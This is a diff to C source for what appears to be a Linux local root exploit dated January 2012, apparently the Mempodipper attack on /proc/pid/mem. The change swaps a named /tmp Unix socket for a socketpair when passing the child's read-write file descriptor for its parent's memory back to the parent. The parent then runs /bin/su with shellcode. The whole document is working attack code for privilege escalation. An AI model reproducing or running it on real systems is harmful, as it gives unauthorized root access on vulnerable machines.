@@ -27,25 +27,14 @@
 #include <unistd.h>
 #include <limits.h>
 
-char *socket_path = "/tmp/.sockpuppet";
-int send_fd(int fd)
+int send_fd(int sock, int fd)
 {
 	char buf[1];
 	struct iovec iov;
 	struct msghdr msg;
 	struct cmsghdr *cmsg;
-	struct sockaddr_un addr;
 	int n;
-	int sock;
 	char cms[CMSG_SPACE(sizeof(int))];
-	
-	if ((sock = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
-		return -1;
-	memset(&addr, 0, sizeof(addr));
-	addr.sun_family = AF_UNIX;
-	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
-	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
-		return -1;
 
 	buf[0] = 0;
 	iov.iov_base = buf;
@@ -69,31 +58,15 @@ int send_fd(int fd)
 	return 0;
 }
 
-int recv_fd()
+int recv_fd(int sock)
 {
-	int listener;
-	int sock;
 	int n;
 	int fd;
 	char buf[1];
 	struct iovec iov;
 	struct msghdr msg;
 	struct cmsghdr *cmsg;
-	struct sockaddr_un addr;
 	char cms[CMSG_SPACE(sizeof(int))];
-
-	if ((listener = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
-		return -1;
-	memset(&addr, 0, sizeof(addr));
-	addr.sun_family = AF_UNIX;
-	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
-	unlink(socket_path);
-	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0)
-		return -1;
-	if (listen(listener, 1) < 0)
-		return -1;
-	if ((sock = accept(listener, NULL, NULL)) < 0)
-		return -1;
 	
 	iov.iov_base = buf;
 	iov.iov_len = 1;
@@ -114,7 +87,6 @@ int recv_fd()
 	cmsg = CMSG_FIRSTHDR(&msg);
 	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));
 	close(sock);
-	close(listener);
 	return fd;
 }
 
@@ -122,7 +94,7 @@ int main(int argc, char **argv)
 {
 	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
 		char parent_mem[256];
-		sprintf(parent_mem, "/proc/%s/mem", argv[2]);
+		sprintf(parent_mem, "/proc/%d/mem", getppid());
 		printf("[+] Opening parent mem %s in child.\n", parent_mem);
 		int fd = open(parent_mem, O_RDWR);
 		if (fd < 0) {
@@ -130,7 +102,7 @@ int main(int argc, char **argv)
 			return 1;
 		}
 		printf("[+] Sending fd %d to parent.\n", fd);
-		send_fd(fd);
+		send_fd(atoi(argv[2]), fd);
 		return 0;
 	}
 	
@@ -140,10 +112,15 @@ int main(int argc, char **argv)
 	printf("=         Jan 21, 2012        =\n");
 	printf("===============================\n\n");
 	
-	int parent_pid = getpid();
+	int sockets[2];
+	printf("[+] Opening socketpair.\n");
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets) < 0) {
+		perror("[-] socketpair");
+		return -1;
+	}
 	if (fork()) {
 		printf("[+] Waiting for transferred fd in parent.\n");
-		int fd = recv_fd();
+		int fd = recv_fd(sockets[1]);
 		printf("[+] Received fd at %d.\n", fd);
 		if (fd < 0) {
 			perror("[-] recv_fd");
@@ -206,9 +183,9 @@ int main(int argc, char **argv)
 		printf("[+] Executing su with shellcode.\n");
 		execl("/bin/su", "su", shellcode, NULL);
 	} else {
-		char pid[32];
-		sprintf(pid, "%d", parent_pid);
+		char sock[32];
+		sprintf(sock, "%d", sockets[0]);
 		printf("[+] Executing child from child fork.\n");
-		execl("/proc/self/exe", argv[0], "-c", pid, NULL);
+		execl("/proc/self/exe", argv[0], "-c", sock, NULL);
 	}
 }
